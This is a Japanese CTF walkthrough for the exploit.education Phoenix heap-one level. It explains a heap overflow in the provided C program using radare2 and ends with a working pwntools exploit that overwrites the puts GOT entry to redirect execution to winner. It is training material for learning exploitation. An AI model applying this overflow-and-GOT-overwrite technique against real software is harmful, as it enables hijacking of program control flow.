---
description: 'http://exploit.education/phoenix/heap-one/'
---

# heap1

## ソースコード

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

struct heapStructure {
  int priority;
  char *name;
};

int main(int argc, char **argv) {
  struct heapStructure *i1, *i2;

  i1 = malloc(sizeof(struct heapStructure));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct heapStructure));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}

void winner() {
  printf(
      "Congratulations, you've completed this level @ %ld seconds past the "
      "Epoch\n",
      time(NULL));
}
```

## 解析

このプログラムは次のことを行います。

* ヒープ上に `heapStructure` 用のチャンクを確保する
* その `heapStructure` の `name` 用に、ヒープ上にもう 1 つチャンクを確保する
* 別の `heapStructure` についても同じ処理を繰り返す
* 2 つのコマンドライン引数を、それぞれの `heapStructure` の `name` 変数にコピーする
* 何かを出力する

### 通常の実行

最初の `strcpy` の直前と直後でブレークしましょう。

```text
$ r2 -d -A heap1 AAAA BBBB
```

![](../../../.gitbook/assets/image%20%287%29.png)

予想どおり、`heapStructure` と `name` のチャンクのペアが 2 組あります。`strcpy` は `name` が指す先にコピーすることが分かっているので、最初の `heapStructure` の内容を読んでみましょう。何かヒントが得られるかもしれません。

![](../../../.gitbook/assets/image%20%288%29.png)

見てください。`name` ポインタが `name` チャンクを指しています。`0x602030` という値が格納されているのが分かります。

これ自体は特に新しい発見ではありません。チャンクの中にポインタがあることは**分かっていた**からです。しかし、これで確証が得られました。境界チェックがないため、このポインタを_確実に_上書きできます。さらに**書き込まれる**値も制御できるので、これは実質的に任意書き込み(arbitrary write)になります。

では、狙う場所として GOT 以上にふさわしいものがあるでしょうか。

## エクスプロイト

したがって、計画は次のようになります。

* ポインタの位置までパディングする
* ポインタを、ある関数の GOT アドレスで上書きする
* 2 番目の引数を `winner` のアドレスに設定する
* 次にその関数が呼ばれたときに、`winner` が呼ばれる

では、どの関数を上書きすればよいでしょうか。ソースコードによると、`strcpy` の後に呼ばれる関数は `printf` だけです。しかし `printf` を `winner` で上書きすると、`winner` 内の `printf` から自分自身を再帰的に呼び続けてしまいます。

幸い、`gcc` のようなコンパイラは、引数がない `printf` を `puts` としてコンパイルします。radare2 で確認できます。

```text
$ r2 -d -A heap1
$ s main; pdf
[...]
0x004006e6      e8f5fdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
0x004006eb      bfa8074000     mov edi, str.and_that_s_a_wrap_folks ; 0x4007a8 ; "and that's a wrap folks!"
0x004006f0      e8fbfdffff     call sym.imp.puts
```

したがって、`puts` の GOT アドレスを `winner` で上書きすればよいことになります。あとはポインタまでのパディングを調べれば準備完了です。

```text
$ ragg2 -P 200 -r
AABAA...
```

```text
$ r2 -d -A heap1 AAABAA... 0000
```

もう一度 `strcpy` の直前と直後でブレークし、2 番目のチャンクの `name` ポインタを解析します。

![](../../../.gitbook/assets/image%20%286%29.png)

ポインタは元々 `0x8d9050` にあり、strcpy が実行されると、そこの値は `0x41415041414f4141` になります。

```text
[0x004006cd]> wopO 0x41415041414f4141
40
```

オフセットは **40** です。

### 最終的なエクスプロイト

```python
from pwn import *

elf = context.binary = ELF('./heap1', checksec=False)

param1 = (b'A' * 40 + p64(elf.got['puts'])).replace(b'\x00', b'')
param2 = p64(elf.sym['winner']).replace(b'\x00', b'')

p = elf.process(argv=[param1, param2])

print(p.clean().decode('latin-1'))
```

ここでも、引数にはヌルバイトを含められないため、取り除く必要があります。

